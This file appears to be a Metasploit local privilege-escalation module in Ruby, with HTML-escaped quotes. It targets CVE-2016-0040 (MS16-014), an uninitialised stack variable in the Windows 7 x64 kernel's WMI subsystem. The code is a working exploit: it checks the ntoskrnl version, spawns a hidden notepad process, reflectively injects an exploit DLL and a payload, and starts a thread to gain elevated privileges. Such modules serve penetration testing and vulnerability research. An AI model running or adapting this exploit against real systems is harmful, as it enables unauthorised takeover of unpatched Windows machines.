# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/post/windows/reflective_dll_injection&#039;
class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Windows WMI Recieve Notification Exploit&#039;,
      &#039;Description&#039;     => %q(
        This module exploits an uninitialized stack variable in the WMI subsystem of ntoskrnl.
        This module has been tested on vulnerable builds of Windows 7 SP0 x64 and Windows 7 SP1 x64.
      ),
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          => [
        &#039;smmrootkit&#039;,      # crash code
        &#039;de7ec7ed&#039;,        # exploit code
        &#039;de7ec7ed&#039;,        # msf module
      ],
      &#039;Arch&#039;            => [ARCH_X64],
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;DefaultOptions&#039;  => {
        &#039;EXITFUNC&#039; => &#039;thread&#039;
      },
      &#039;Targets&#039; => [
        [&#039;Windows 7 SP0/SP1&#039;, { &#039;Arch&#039; => ARCH_X64 }]
      ],
      &#039;Payload&#039; => {
        &#039;Space&#039;       => 4096,
        &#039;DisableNops&#039; => true
      },
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2016-0040&#039;],
        [&#039;MSB&#039;, &#039;MS16-014&#039;],
        [&#039;URL&#039;, &#039;https://github.com/de7ec7ed/CVE-2016-0040&#039;],
        [&#039;URL&#039;, &#039;https://github.com/Rootkitsmm/cve-2016-0040&#039;],
        [&#039;URL&#039;, &#039;https://technet.microsoft.com/en-us/library/security/ms16-014.aspx&#039;]
      ],
      &#039;DisclosureDate&#039;  => &#039;Dec 4 2015&#039;,
      &#039;DefaultTarget&#039;   => 0)
  )
  end

  def check
    # Windows 7 SP0/SP1 (64-bit)

    if sysinfo[&#039;OS&#039;] !~ /windows/i
      return Exploit::CheckCode::Unknown
    end

    file_path = expand_path(&#039;%windir%&#039;) << &#039;\\system32\\ntoskrnl.exe&#039;
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("ntoskrnl.exe file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")

    return Exploit::CheckCode::Safe if build > 7601

    return Exploit::CheckCode::Appears
  end

  def exploit
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end

    check_result = check
    if check_result == Exploit::CheckCode::Safe || check_result == Exploit::CheckCode::Unknown
      fail_with(Failure::NotVulnerable, &#039;Exploit not available on this system.&#039;)
    end

    if sysinfo[&#039;Architecture&#039;] == ARCH_X64 && session.arch == ARCH_X86
      fail_with(Failure::NoTarget, &#039;Running against WOW64 is not supported&#039;)
    end

    print_status(&#039;Launching notepad to host the exploit...&#039;)
    notepad_process = client.sys.process.execute(&#039;notepad.exe&#039;, nil, &#039;Hidden&#039; => true)
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      # Reader Sandbox won&#039;t allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status(&#039;Operation failed. Trying to elevate the current process...&#039;)
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2016-0040&#039;, &#039;CVE-2016-0040.x64.dll&#039;)
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status(&#039;Payload injected. Executing exploit...&#039;)
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good("Exploit finished, wait for (hopefully privileged) payload execution to complete.")
  end
end

